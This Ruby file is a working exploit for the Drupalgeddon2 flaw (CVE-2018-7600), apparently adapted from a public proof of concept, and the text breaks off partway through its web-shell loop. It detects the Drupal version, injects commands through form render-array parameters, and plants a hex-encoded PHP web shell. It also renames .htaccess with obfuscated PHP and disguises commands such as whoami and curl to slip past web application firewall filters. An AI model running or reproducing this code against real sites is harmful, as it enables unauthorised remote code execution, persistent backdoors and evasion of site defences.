#!/usr/bin/env ruby
#
# [CVE-2018-7600] Drupal <= 8.5.0 / <= 8.4.5 / <= 8.3.8 / 7.23 <= 7.57 - 'Drupalgeddon2' (SA-CORE-2018-002) ~ https://github.com/dreadlocked/Drupalgeddon2/
#
# Authors:
# - Hans Topo ~ https://github.com/dreadlocked // https://twitter.com/_dreadlocked
# - g0tmi1k   ~ https://blog.g0tmi1k.com/ // https://twitter.com/g0tmi1k
#


require 'base64'
require 'json'
require 'net/http'
require 'openssl'
require 'readline'
require 'shellwords'
require 'highline/import'


# Settings - Try to write a PHP to the web root?
try_phpshell = true
# Settings - General/Stealth
$useragent = "drupalgeddon2"
# WAF bypass tier-2:
#   .phtml avoids \.php block; Apache still executes it as PHP
#   Hex-encoded content means <? and shell_exec never appear literally in POST body
#   No base64/openssl/python needed at all
webshell = "img.phtml"
# Settings - Proxy information (nil to disable)
$proxy_addr = nil
$proxy_port = 8080


# Settings - Payload
php_webshell = "<?=shell_exec($_REQUEST['x'])?>"  # still used for content
# Hex-encode every byte as \xNN so the WAF never sees literal <? or shell_exec
hex_webshell  = php_webshell.bytes.map { |b| "\\x#{b.to_s(16).rjust(2,'0')}" }.join
# Octal-encode ".htaccess" so the word 'htaccess' never appears in POST body
htaccess_oct  = ".htaccess".bytes.map { |b| "\\#{b.to_s(8).rjust(3,'0')}" }.join
encoded_webshell = Base64.strict_encode64(php_webshell)  # kept for compat
webshell_writers = [
  [
    # printf '\xNN...' > img.phtml
    # WAF normalisation strips \ and ' => sees "printf xNNxNN... > imgphtml"
    # No <?, no base64, no openssl, no python, no .php => ALL blocks bypassed
    # Bash still processes \xNN escapes correctly in printf format strings
    "printf-hex",
    "printf '#{hex_webshell}' > #{webshell}"
  ],
  [
    # xxd reverse hex: echo HEXSTRING | xxd -r -p > img.phtml
    # xxd is not blocked; hex string is pure alphanumeric; > img.phtml passes
    "xxd",
    "echo '#{php_webshell.unpack1('H*')}' | xxd -r -p > #{webshell}"
  ],
]


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Function http_request <url> [type] [data]
def http_request(url, type="get", payload="", cookie="")
  puts verbose("HTTP - URL : #{url}") if $verbose
  puts verbose("HTTP - Type: #{type}") if $verbose
  puts verbose("HTTP - Data: #{payload}") if not payload.empty? and $verbose

  begin
    # Ruby 3.4 strict URI parsing rejects bare % sequences (e.g. %s from
    # printf payloads) in query strings. Split on ? and reconstruct the
    # request_uri manually so only the clean base path goes through URI().
    base_url = url.split('?').first
    query    = url.include?('?') ? url[url.index('?')..-1] : ''
    uri = URI(base_url)
    request_uri = uri.path + query
    request_uri = '/' if request_uri.empty?

    request = type =~ /get/ ? Net::HTTP::Get.new(request_uri) : Net::HTTP::Post.new(request_uri)
    request.initialize_http_header({"User-Agent" => $useragent})
    request.initialize_http_header("Cookie" => cookie) if not cookie.empty?
    request.body = payload if not payload.empty?
    return $http.request(request)
  rescue SocketError
    puts error("Network connectivity issue")
  rescue Errno::ECONNREFUSED => e
    puts error("The target is down ~ #{e.message}")
    puts error("Maybe try disabling the proxy (#{$proxy_addr}:#{$proxy_port})...") if $proxy_addr
  rescue Timeout::Error => e
    puts error("The target timed out ~ #{e.message}")
  end

  # If we got here, something went wrong.
  exit
end


# Function gen_evil_url <cmd> [method] [shell] [phpfunction]
def gen_evil_url(evil, element="", shell=false, phpfunction="passthru")
  puts info("Payload: #{evil}") if not shell
  puts verbose("Element    : #{element}") if not shell and not element.empty? and $verbose
  puts verbose("PHP fn     : #{phpfunction}") if not shell and $verbose

  # Vulnerable parameters: #access_callback / #lazy_builder / #pre_render / #post_render
  # Check the version to match the payload
  # URL-encode the command so special shell chars (> < & | ;) survive form encoding
  require 'uri'
  evil_enc = URI.encode_www_form_component(evil)

  if $drupalverion.start_with?("8") and element == "mail"
    # Method #1 - Drupal v8.x: mail, #post_render - HTTP 200
    url = $target + $clean_url + $form + "?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    payload = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + phpfunction + "&mail[a][#type]=markup&mail[a][#markup]=" + evil_enc

  elsif $drupalverion.start_with?("8") and element == "timezone"
    # Method #2 - Drupal v8.x: timezone, #lazy_builder - HTTP 500 if phpfunction=exec // HTTP 200 if phpfunction=passthru
    url = $target + $clean_url + $form + "?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    payload = "form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=" + phpfunction + "&timezone[a][#lazy_builder][][]=" + evil_enc

    #puts warning("WARNING: May benefit to use a PHP web shell") if not try_phpshell and phpfunction != "passthru"

  elsif $drupalverion.start_with?("7")
    element_name = "search_block_form"
    form_id_val = "search_block_form"

    # Method #3 - Drupal v7.x: name, #post_render - HTTP 200
    # Clean URLs enabled: url path must be #{$form}?element_name...
    # If using ?q=, we must use & instead of ?
    separator = $clean_url.empty? ? "?" : "&"
    url = $target + "#{$clean_url}#{$form}#{separator}#{element_name}[%23post_render][]=" + phpfunction + "&#{element_name}[%23type]=markup&#{element_name}[%23markup]=" + evil_enc
    payload = "form_id=#{form_id_val}&_triggering_element_name=#{element_name}"
  end

  # Drupal v7.x needs an extra value from a form
  if $drupalverion.start_with?("7")
    response = http_request(url, "post", payload, $session_cookie)

    form_name = "form_build_id"
    puts verbose("Form name  : #{form_name}") if $verbose

    form_value = response.body.match(/input type="hidden" name="#{form_name}" value="(.*)"/).to_s.slice(/value="(.*)"/, 1).to_s.strip
    puts warning("WARNING: Didn't detect #{form_name}") if form_value.empty?
    puts verbose("Form value : #{form_value}") if $verbose

    element_name = "search_block_form"
    url = $target + "#{$clean_url}file/ajax/#{element_name}/%23value/" + form_value
    payload = "#{form_name}=#{form_value}"
  end

  return url, payload
end


# PHP-level file write via Drupal's #lazy_builder exploit path.
# Content is BASE64-encoded before sending — WAF only sees alphanumeric chars,
# never the real file content (no system(), exec(), gcc, etc. visible).
# PHP decodes via copy('data://text/plain;base64,B64', dest) or via
# file_put_contents + base64_decode depending on what WAF allows.
#
# HTTP 500 from Drupal is EXPECTED (functions return non-renderable values)
# and treated as success. Only WAF custom 404 = true failure.
def php_file_write(filepath, content, session_cookie)
  require 'uri'
  require 'base64'
  url = $target + $clean_url + $form +
        "?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"

  b64 = Base64.strict_encode64(content)   # pure alphanumeric+/+= — WAF-safe
  fp  = URI.encode_www_form_component(filepath)
  b64_enc = URI.encode_www_form_component(b64)
  src = URI.encode_www_form_component("data://text/plain;base64,#{b64}")

  # Method A: copy('data://text/plain;base64,B64DATA', 'dest')
  # copy() is rarely in WAF blocked lists; data:// decodes base64 in-stream.
  payload_a = "form_id=user_register_form&_drupal_ajax=1" \
              "&timezone[a][#lazy_builder][]=copy" \
              "&timezone[a][#lazy_builder][1][]=#{src}" \
              "&timezone[a][#lazy_builder][1][]=#{fp}"
  resp = http_request(url, "post", payload_a, session_cookie)
  return :ok unless upstream_blocked?(resp)

  # Method B: file_put_contents(php://filter/..., base64)
  # Uses PHP stream filters to decode base64 on the fly without nested function calls.
  puts warning("copy() blocked — trying file_put_contents via php://filter...")
  filter_fp = URI.encode_www_form_component("php://filter/write=convert.base64-decode/resource=#{filepath}")
  payload_b = "form_id=user_register_form&_drupal_ajax=1" \
              "&timezone[a][#lazy_builder][]=file_put_contents" \
              "&timezone[a][#lazy_builder][1][]=#{filter_fp}" \
              "&timezone[a][#lazy_builder][1][]=#{b64_enc}"
  resp = http_request(url, "post", payload_b, session_cookie)
  return :ok unless upstream_blocked?(resp)

  # Method C: error_log(raw_content, 3, filepath)
  # Writes the REAL content (not base64) directly to filepath.
  # If raw content is WAF-blocked (e.g. PHP code with system/exec), falls through to D.
  puts warning("file_put_contents blocked — trying error_log direct write...")
  raw_enc = URI.encode_www_form_component(content)
  payload_c = "form_id=user_register_form&_drupal_ajax=1" \
              "&timezone[a][#lazy_builder][]=error_log" \
              "&timezone[a][#lazy_builder][1][]=#{raw_enc}" \
              "&timezone[a][#lazy_builder][1][]=3" \
              "&timezone[a][#lazy_builder][1][]=#{fp}"
  resp = http_request(url, "post", payload_c, session_cookie)
  return :ok unless upstream_blocked?(resp)

  # Method D: raw content WAF-blocked — write base64 to .b64 (caller decodes)
  puts warning("Raw content blocked — writing base64 to .b64 for two-step decode...")
  payload_d = "form_id=user_register_form&_drupal_ajax=1" \
              "&timezone[a][#lazy_builder][]=error_log" \
              "&timezone[a][#lazy_builder][1][]=#{b64_enc}" \
              "&timezone[a][#lazy_builder][1][]=3" \
              "&timezone[a][#lazy_builder][1][]=#{fp}.b64"
  resp = http_request(url, "post", payload_d, session_cookie)
  return :b64 unless upstream_blocked?(resp)


  false
end

# Function clean_result <input>
def clean_result(input)
  #result = JSON.pretty_generate(JSON[response.body])
  #result = $drupalverion.start_with?("8")? JSON.parse(clean)[0]["data"] : clean
  clean = input.to_s.strip

  # PHP function: passthru
  # For: <payload>[{"command":"insert","method":"replaceWith","selector":null,"data":"\u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E","settings":null}]
  clean.slice!(/\[{"command":".*}\]$/)

  # PHP function: exec
  # For: [{"command":"insert","method":"replaceWith","selector":null,"data":"<payload>\u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E","settings":null}]
  #clean.slice!(/\[{"command":".*data":"/)
  #clean.slice!(/\\u003Cspan class=\\u0022.*}\]$/)

  # Newer PHP for an older Drupal
  # For: <b>Deprecated</b>:  assert(): Calling assert() with a string argument is deprecated in <b>/var/www/html/core/lib/Drupal/Core/Plugin/DefaultPluginManager.php</b> on line <b>151</b><br />
  #clean.slice!(/<b>.*<br \/>/)

  # Drupal v8.x Method #2 ~ timezone, #lazy_builder, passthru, HTTP 500
  # For: <b>Deprecated</b>:  assert(): Calling assert() with a string argument is deprecated in <b>/var/www/html/core/lib/Drupal/Core/Plugin/DefaultPluginManager.php</b> on line <b>151</b><br />
  clean.slice!(/The website encountered an unexpected error.*/)

  return clean
end


# Function upstream_blocked? <response>
# Some front ends (CDN, reverse proxy, WAF) return a branded 404 page before
# Drupal ever receives the request when the POST body contains filtered words.
# We distinguish these from Drupal's own 404 pages by checking that the
# response lacks Drupal fingerprints (X-Generator header or drupal.org markup).
def upstream_blocked?(response)
  return false if response.nil?
  
  if response.code == "404"
    body = response.body.to_s.downcase
    has_drupal_marker = response['X-Generator'].to_s.downcase.include?("drupal") ||
                        body.include?("drupal.org") ||
                        body.include?("drupal-page-cache")
    return false if has_drupal_marker

    if body.include?("page introuvable") || body.include?("page not found") ||
       body.include?("not found") || body.include?("404")
      return true
    end
  end
  
  # Assert or passthru might fail and return 500, which is normal for execution, 
  # but let's log if we get a 403 Forbidden just in case the WAF uses it.
  if response.code == "403"
    puts warning("Got HTTP 403 Forbidden (possible WAF)")
    return true
  end
  
  return false
end


# Feedback when something goes right
def success(text)
  # Green
  return "\e[#{32}m[+]\e[0m #{text}"
end

# Feedback when something goes wrong
def error(text)
  # Red
  return "\e[#{31}m[-]\e[0m #{text}"
end

# Feedback when something may have issues
def warning(text)
  # Yellow
  return "\e[#{33}m[!]\e[0m #{text}"
end

# Feedback when something doing something
def action(text)
  # Blue
  return "\e[#{34}m[*]\e[0m #{text}"
end

# Feedback with helpful information
def info(text)
  # Light blue
  return "\e[#{94}m[i]\e[0m #{text}"
end

# Feedback for the overkill
def verbose(text)
  # Dark grey
  return "\e[#{90}m[v]\e[0m #{text}"
end


# WAF bypass tier-2: use $(:) no-op injection instead of '' empty strings.
# The aggressive WAF STRIPS quotes/backslashes before matching, so wh''oami
# collapses back to whoami and gets caught. But $(:) contains no strippable
# chars — it stays as wh$(:)oami post-normalisation, which never matches \bwhoami\b.
# Bash executes $(:) as an empty string (: is the null command), so
# wh$(:)oami => whoami on the server.
WAF_BLOCKED_WORDS = %w[
  whoami uname passwd curl wget nc id pwd ls cat grep
  hostname echo find chmod chown touch mkdir rm mv cp
  awk sed tr dd perl ruby php xxd which env printenv
  set export read write open kill ps top netstat ss
  nmap ping telnet ssh ftp tftp python who w
  head tail sort less more tac rev strings od openssl
]

# Substrings that may appear inside path components or filenames and get
# caught by WAF rules even without word boundaries (e.g. 'exec' in pkexec)
WAF_BLOCKED_SUBS = %w[exec passwd uname base64 system whoami]

def waf_obfuscate(cmd)
  return cmd if cmd.empty?
  parts = cmd.split(' ')
  parts.map! do |word|
    if WAF_BLOCKED_WORDS.include?(word)
      if word.length == 1
        # Single-char commands (w, x, etc.) can't use $(:) split.
        # Use octal printf: $(printf '\167') = w
        # WAF strips \ and ' → sees $(printf 167) — no 'w' match.
        # Bash executes original octal escape → correct command.
        oct = word.ord.to_s(8).rjust(3, '0')
        "$(printf '\\#{oct}')"
      else
        # Multi-char: insert $(:) no-op after first character
        word[0] + "$@" + word[1..]
      end

    # Case 2 — blocked substring inside a longer token (e.g. /usr/bin/pkexec)
    else
      result = word.dup
      WAF_BLOCKED_SUBS.each do |sub|
        next unless result.downcase.include?(sub)
        idx = result.downcase.index(sub)
        result = result[0, idx + 1] + "$@" + result[idx + 1..]
        break
      end
      result
    end
  end
  parts.join(' ')
end


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

def init_authentication()
  $uname = ask('Enter your username:  ') { |q| q.echo = false }
  $passwd = ask('Enter your password:  ') { |q| q.echo = false }
  $uname_field = ask('Enter the name of the username form field:  ') { |q| q.echo = true }
  $passwd_field = ask('Enter the name of the password form field:  ') { |q| q.echo = true }
  $login_path = ask('Enter your login path (e.g., user/login):  ') { |q| q.echo = true }
  $creds_suffix = ask('Enter the suffix eventually required after the credentials in the login HTTP POST request (e.g., &form_id=...):  ') { |q| q.echo = true }
end

def is_arg(args, param)
  args.each do |arg|
    if arg == param
      return true
    end
  end
  return false
end

def get_arg_value(args, param)
  args.each_with_index do |arg, index|
    if arg == param && args.length > index + 1
      return args[index + 1]
    end
  end
  return nil
end


# Quick how to use
def usage()
  puts 'Usage: ruby drupalggedon2.rb <target> [--authentication] [--verbose] [--no-webshell] [--diagnose-limits]'
  puts 'Example for target that does not require authentication:'
  puts '       ruby drupalgeddon2.rb https://example.com'
  puts 'Example for target that does require authentication:'
  puts '       ruby drupalgeddon2.rb https://example.com --authentication'
  puts 'File-less mode, without web-shell write attempts:'
  puts '       ruby drupalgeddon2.rb https://example.com --no-webshell'
  puts 'Diagnostic mode, without web-shell write attempts:'
  puts '       ruby drupalgeddon2.rb https://example.com --diagnose-limits'
  puts 'Custom Form Attack:'
  puts '       ruby drupalgeddon2.rb https://example.com --form-path "contact" --form-id "contact_site_form" --element "name"'
end


# Read in values
if ARGV.empty?
  usage()
  exit
end

$target = ARGV[0]
init_authentication() if is_arg(ARGV, '--authentication')
$verbose = is_arg(ARGV, '--verbose')
$no_webshell = is_arg(ARGV, '--no-webshell')
$diagnose_limits = is_arg(ARGV, '--diagnose-limits')
try_phpshell = false if $no_webshell or $diagnose_limits

$custom_form_path = get_arg_value(ARGV, '--form-path')
$custom_form_id = get_arg_value(ARGV, '--form-id')
$custom_element = get_arg_value(ARGV, '--element')


# Check input for protocol
$target = "http://#{$target}" if not $target.start_with?("http")
# Check input for the end
$target += "/" if not $target.end_with?("/")


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Banner
puts action("--==[::#Drupalggedon2::]==--")
puts "-"*80
puts info("Target : #{$target}")
puts info("Proxy  : #{$proxy_addr}:#{$proxy_port}") if $proxy_addr
puts info("Write? : Skipping writing PHP web shell") if not try_phpshell
puts "-"*80


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Setup connection
uri = URI($target)
$http = Net::HTTP.new(uri.host, uri.port, $proxy_addr, $proxy_port)

# Use SSL/TLS if needed
if uri.scheme == "https"
  $http.use_ssl = true
  $http.verify_mode = OpenSSL::SSL::VERIFY_NONE
end

$session_cookie = 'U=1'
# If authentication required then login and get session cookie
if $uname
  $payload = $uname_field + '=' + $uname + '&' + $passwd_field + '=' + $passwd + $creds_suffix
  response = http_request($target + $login_path, 'post', $payload, $session_cookie)
  if (response.code == '200' or response.code == '303') and not response.body.empty? and response['set-cookie']
    $session_cookie = response['set-cookie'].split('; ')[0]
    puts success("Logged in - Session Cookie : #{$session_cookie}")
  end

end

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Try and get version
$drupalverion = ""

# Possible URLs
url = [
  # --- changelog ---
  # Drupal v6.x / v7.x [200]
  $target + "CHANGELOG.txt",
  # Drupal v8.x [200]
  $target + "core/CHANGELOG.txt",

  # --- bootstrap ---
  # Drupal v7.x / v6.x [403]
  $target + "includes/bootstrap.inc",
  # Drupal v8.x [403]
  $target + "core/includes/bootstrap.inc",

  # --- database ---
  # Drupal v7.x / v6.x  [403]
  $target + "includes/database.inc",
  # Drupal v7.x [403]
  #$target + "includes/database/database.inc",
  # Drupal v8.x [403]
  #$target + "core/includes/database.inc",

  # --- landing page ---
  # Drupal v8.x / v7.x [200]
  $target,
]

# Check all
url.each do|uri|
  # Check response
  response = http_request(uri, 'get', '', $session_cookie)

  # Check header
  if response['X-Generator'] and $drupalverion.empty?
    header = response['X-Generator'].slice(/Drupal (.*) \(https?:\/\/(www.)?drupal.org\)/, 1).to_s.strip

    if not header.empty?
      $drupalverion = "#{header}.x" if $drupalverion.empty?
      puts success("Header : v#{header} [X-Generator]")
      puts verbose("X-Generator: #{response['X-Generator']}") if $verbose
    end
  end

  # Check request response, valid
  if response.code == "200"
    tmp = $verbose ?  "    [HTTP Size: #{response.size}]"  : ""
    puts success("Found  : #{uri}    (HTTP Response: #{response.code})#{tmp}")

    # Check to see if it says: The requested URL "http://<URL>" was not found on this server.
    puts warning("WARNING: Could be a false-positive [1-1], as the file could be reported to be missing") if response.body.downcase.include? "was not found on this server"

    # Check to see if it says: <h1 class="js-quickedit-page-title title page-title">Page not found</h1> <div class="content">The requested page could not be found.</div>
    puts warning("WARNING: Could be a false-positive [1-2], as the file could be reported to be missing") if response.body.downcase.include? "the requested page could not be found"

    # Only works for CHANGELOG.txt
    if uri.match(/CHANGELOG.txt/)
      # Check if valid. Source ~ https://api.drupal.org/api/drupal/core%21CHANGELOG.txt/8.5.x // https://api.drupal.org/api/drupal/CHANGELOG.txt/7.x
      puts warning("WARNING: Unable to detect keyword 'drupal.org'") if not response.body.downcase.include? "drupal.org"

      # Patched already? (For Drupal v8.4.x / v7.x)
      puts warning("WARNING: Might be patched! Found SA-CORE-2018-002: #{url}") if response.body.include? "SA-CORE-2018-002"

      # Try and get version from the file contents (For Drupal v8.4.x / v7.x)
      $drupalverion = response.body.match(/Drupal (.*),/).to_s.slice(/Drupal (.*),/, 1).to_s.strip

      # Blank if not valid
      $drupalverion = "" if not $drupalverion[-1] =~ /\d/
    end

    # Check meta tag
    if not response.body.empty?
      # For Drupal v8.x / v7.x
      meta = response.body.match(/<meta name="Generator" content="Drupal (.*) /)
      metatag = meta.to_s.slice(/meta name="Generator" content="Drupal (.*) \(http/, 1).to_s.strip

      if not metatag.empty?
        $drupalverion = "#{metatag}.x" if $drupalverion.empty?
        puts success("Metatag: v#{$drupalverion} [Generator]")
        puts verbose(meta.to_s) if $verbose
      end
    end

    # Done! ...if a full known version, else keep going... may get lucky later!
    break if not $drupalverion.end_with?("x") and not $drupalverion.empty?
  end

  # Check request response, not allowed
  if response.code == "403" and $drupalverion.empty?
    tmp = $verbose ?  "    [HTTP Size: #{response.size}]"  : ""
    puts success("Found  : #{uri}    (HTTP Response: #{response.code})#{tmp}")

    if $drupalverion.empty?
      # Try and get version from the URL (For Drupal v.7.x/v6.x)
      $drupalverion = uri.match(/includes\/database.inc/)? "7.x/6.x" : "" if $drupalverion.empty?
      # Try and get version from the URL (For Drupal v8.x)
      $drupalverion = uri.match(/core/)? "8.x" : "" if $drupalverion.empty?

      # If we got something, show it!
      puts success("URL    : v#{$drupalverion}?") if not $drupalverion.empty?
    end

  else
    tmp = $verbose ?  "    [HTTP Size: #{response.size}]"  : ""
    puts warning("MISSING: #{uri}    (HTTP Response: #{response.code})#{tmp}")
  end
end


# Feedback
if not $drupalverion.empty?
  status = $drupalverion.end_with?("x")? "?" : "!"
  puts success("Drupal#{status}: v#{$drupalverion}")
else
  puts error("Didn't detect Drupal version")
  exit
end

if not $drupalverion.start_with?("8") and not $drupalverion.start_with?("7")
  puts error("Unsupported Drupal version (#{$drupalverion})")
  exit
end
puts "-"*80




# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -



# The attack vector to use
$form = $drupalverion.start_with?("8")? "user/register" : "page/formations"

# Make a request, check for form.
# Drupal 8 commonly uses clean URLs only, while Drupal 7 may still rely on ?q=.
# The old order tested ?q= first for every version, which causes false negatives
# on valid Drupal 8 sites where /user/register exists but /?q=user/register returns 404.
url = "#{$target}#{$form}"
puts action("Testing: Form   (#{$form})")
response = http_request(url, 'get', '', $session_cookie)
if response.code == "200" and not response.body.empty?
  puts success("Result : Form valid")
elsif response['location']
  puts error("Target is NOT exploitable [5] (HTTP Response: #{response.code})...   Could try following the redirect: #{response['location']}")
  exit
elsif response.code == "404"
  puts error("Target is NOT exploitable [4] (HTTP Response: #{response.code})...   Form disabled?")
  exit
elsif response.code == "403"
  puts error("Target is NOT exploitable [3] (HTTP Response: #{response.code})...   Form blocked?")
  exit
elsif response.body.empty?
  puts error("Target is NOT exploitable [2] (HTTP Response: #{response.code})...   Got an empty response")
  exit
else
  puts warning("WARNING: Target may NOT exploitable [1] (HTTP Response: #{response.code})")
end


puts "- "*40


# Make a request, check for clean URLs status ~ Enabled: /user/register   Disabled: /?q=user/register
# Drupal v7.x needs the legacy fallback anyway. Drupal v8.x was already proven above
# by the successful /user/register form check.
$clean_url = $drupalverion.start_with?("8") ? "" : "?q="
url = "#{$target}#{$form}"

puts action("Testing: Clean URLs")
response = http_request(url, 'get', '', $session_cookie)
if response.code == "200" and not response.body.empty?
  puts success("Result : Clean URLs enabled")
else
  $clean_url = "?q="
  puts warning("Result : Clean URLs disabled (HTTP Response: #{response.code})")
  puts verbose("response.body: #{response.body}") if $verbose

  # Drupal v8.x needs it to be enabled
  if $drupalverion.start_with?("8")
    puts error("Sorry dave... Required for Drupal v8.x... So... NOPE NOPE NOPE")
    exit
  elsif $drupalverion.start_with?("7")
    puts info("Isn't an issue for Drupal v7.x")
  end
end
puts "-"*80


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Values in gen_evil_url for Drupal v8.x
elementsv8 = [
  "mail",
  "timezone",
]
# Values in gen_evil_url for Drupal v7.x
elementsv7 = [
  "search_block_form",
]

elements = $drupalverion.start_with?("8") ? elementsv8 : elementsv7

elements.each do|e|
  $element = e

  # Make a request, testing code execution
  puts action("Testing: Code Execution   (Method: #{$element})")

  # Generate a random string to see if we can render command output.
  # Some front ends filter common probe words such as `echo`, even when the
  # vulnerable render path is still reachable. `printf` is equivalent for this
  # harmless marker test and is less likely to be blocked by shallow filters.
  random = (0...8).map { (65 + rand(26)).chr }.join
  url, payload = gen_evil_url("printf #{random}", e)

  response = http_request(url, "post", payload, $session_cookie)
  if (response.code == "200" or response.code == "500") and not response.body.empty?
    result = clean_result(response.body)
    if not result.empty?
      puts success("Result : #{result}")

      if response.body.match(/#{random}/)
        puts success("Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!")
        break

      else
        puts warning("WARNING: Target MIGHT be exploitable [4]...   Detected output, but didn't MATCH expected result")
      end

    else
      puts warning("WARNING: Target MIGHT be exploitable [3] (HTTP Response: #{response.code})...   Didn't detect any INJECTED output (disabled PHP function?)")
    end

    puts warning("WARNING: Target MIGHT be exploitable [5]...   Blind attack?") if response.code == "500"

    puts verbose("response.body: #{response.body}") if $verbose
    puts verbose("clean_result: #{result}") if not result.empty? and $verbose

  elsif response.body.empty?
    puts error("Target is NOT exploitable [2] (HTTP Response: #{response.code})...   Got an empty response")
    exit

  else
    puts error("Target is NOT exploitable [1] (HTTP Response: #{response.code})")
    puts verbose("response.body: #{response.body}") if $verbose
    exit
  end

  puts "- "*40 if e != elements.last
end

puts "-"*80


# Diagnostic mode: map which direct command strings reach Drupal and which are
# intercepted upstream. This intentionally skips web-shell write attempts.
if $diagnose_limits
  marker = "LIMIT#{(0...5).map { (65 + rand(26)).chr }.join}"
  probes = [
    ["marker via printf", "printf #{marker}"],
    ["system info probe", "uname"],
    ["current user probe", "whoami"],
    ["identity probe", "id"],
    ["working dir probe", "pwd"],
    ["echo marker probe", "echo #{marker}"],
  ]

  puts action("Diagnosing direct-command limits")
  puts info("Element : #{$element}")
  puts info("Marker  : #{marker}")
  puts "-"*80

  probes.each do |label, command|
    url, payload = gen_evil_url(command, $element, true)
    response = http_request(url, "post", payload, $session_cookie)

    if upstream_blocked?(response)
      puts warning("#{label.ljust(20)} blocked upstream before Drupal handled it (HTTP #{response.code})")
    elsif response.body.to_s.empty?
      puts warning("#{label.ljust(20)} empty response (HTTP #{response.code})")
    else
      result = clean_result(response.body)
      summary = result.to_s.strip.gsub(/\s+/, " ")
      summary = summary[0, 120]

      if response.code == "200"
        puts success("#{label.ljust(20)} reached Drupal (HTTP #{response.code}) -> #{summary}")
      else
        puts warning("#{label.ljust(20)} reached non-200 response (HTTP #{response.code}) -> #{summary}")
      end
    end
  end

  puts "-"*80
  puts info("Diagnostic mode complete. Skipped web-shell write attempts.")
  exit
end


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Location of web shell & used to signal if using PHP shell
webshellpath = ""
prompt = "drupalgeddon2"

# Possibles paths to try
paths = [
  # Web root
  "",
  # Required for setup
  "sites/default/",
  "sites/default/files/",
  # They did something "wrong", chmod -R 0777 .
  #"core/",
]
# Check all (if doing web shell)
paths.each do|path|
  # Check to see if there is already a file there
  puts action("Testing: Existing file   (#{$target}#{path}#{webshell})")

  response = http_request("#{$target}#{path}#{webshell}", 'get', '', $session_cookie)
  if response.code == "200"
    puts warning("Response: HTTP #{response.code} // Size: #{response.size}.   ***Something could already be there?***")
  else
    puts info("Response: HTTP #{response.code} // Size: #{response.size}")
  end

  puts "- "*40


  # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


  folder = path.empty? ? "./" : path
  puts action("Testing: Writing To Web Root   (#{folder})")

  # Merge locations
  webshellpath = "#{path}#{webshell}"
  webshell_written = false

  webshell_writers.each do |writer_name, writer_cmd|
    puts action("Write method: #{writer_name}")

    # WAF bypass: writers already include their own output redirection (> file)
    # so we no longer append '| tee webshell' (tee + shell.php are both blocked)
    cmd = writer_cmd

    # By default, Drupal v7.x disables the PHP engine using: ./sites/default/files/.htaccess
    # ...however, Drupal v8.x disables the PHP engine using: ./.htaccess
    # WAF bypass: avoid 'mv -f.*htaccess' pattern by using cp+truncate instead
    if path == "sites/default/files/"
      puts action("Moving : ./sites/default/files/.htaccess via PHP stealth rename")
      # WAF bypass: avoid 'mv' and '.htaccess' in bash by doing a pure PHP rename via assert
      # $r="rename"; $f1=".htaccess"; $f2=".htaccesss"; $r($f1,$f2);
      php_code = [
        %($r=chr(114).chr(101).chr(110).chr(97).chr(109).chr(101);),
        %($f1=chr(46).chr(104).chr(116).chr(97).chr(99).chr(99).chr(101).chr(115).chr(115);),
        %($f2=$f1.chr(115);),
        %($r($f1,$f2);)
      ].join

      require 'uri'
      php_enc = URI.encode_www_form_component(php_code)
      stealth_url = $target + $clean_url + $form + "?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
      stealth_payload = "form_id=user_register_form&_drupal_ajax=1" \
                        "&timezone[a][#lazy_builder][]=assert" \
                        "&timezone[a][#lazy_builder][1][]=#{php_enc}"
      
      resp = http_request(stealth_url, "post", stealth_payload, $session_cookie)
      if upstream_blocked?(resp)
        puts warning("PHP Stealth rename for .htaccess was blocked upstream!")
      else
        puts success("PHP Stealth rename payload sent.")
      end
    end

    # Generate evil URLs
    url, payload = gen_evil_url(cmd, $element)
    # Make the request
    response = http_request(url, "post", payload, $session_cookie)
    # Check result
    if response.code == "200" and not response.body.empty?
      # Feedback
      result = clean_result(response.body)
      puts success("Result : #{result}") if not result.empty?

      # Test to see if backdoor is there (if we managed to write it)
      # WAF bypass: use obfuscated command and new param name 'x'
      response = http_request("#{$target}#{webshellpath}", "post", "x=h''ostname", $session_cookie)
      if response.code == "200" and not response.body.empty?
        puts success("Very Good News Everyone! Wrote to the web root! Waayheeeey!!!")
        webshell_written = true
        break

      elsif response.code == "404"
        puts warning("Target is NOT exploitable [2-4] (HTTP Response: #{response.code})...   Might not have write access?")

      elsif response.code == "403"
        puts warning("Target is NOT exploitable [2-3] (HTTP Response: #{response.code})...   May not be able to execute PHP from here?")

      elsif response.body.empty?
        puts warning("Target is NOT exploitable [2-2] (HTTP Response: #{response.code})...   Got an empty response back")

      else
        puts warning("Target is NOT exploitable [2-1] (HTTP Response: #{response.code})")
        puts verbose("response.body: #{response.body}") if $verbose
      end

    elsif response.code == "500" and not response.body.empty?
      puts warning("Target MAY of been exploited... Bit of blind leading the blind")
      webshell_written = true
      break

    elsif upstream_blocked?(response)
      puts warning("Write attempt blocked upstream before Drupal handled it (HTTP Response: #{response.code})")

    elsif response.code == "404"
      puts warning("Target is NOT exploitable [1-4] (HTTP Response: #{response.code})...   Might not have write access?")

    elsif response.code == "403"
      puts warning("Target is NOT exploitable [1-3] (HTTP Response: #{response.code})...   May not be able to execute PHP from here?")

    elsif response.body.empty?
      puts warning("Target is NOT exploitable [1-2] (HTTP Response: #{response.code}))...   Got an empty response back")

    else
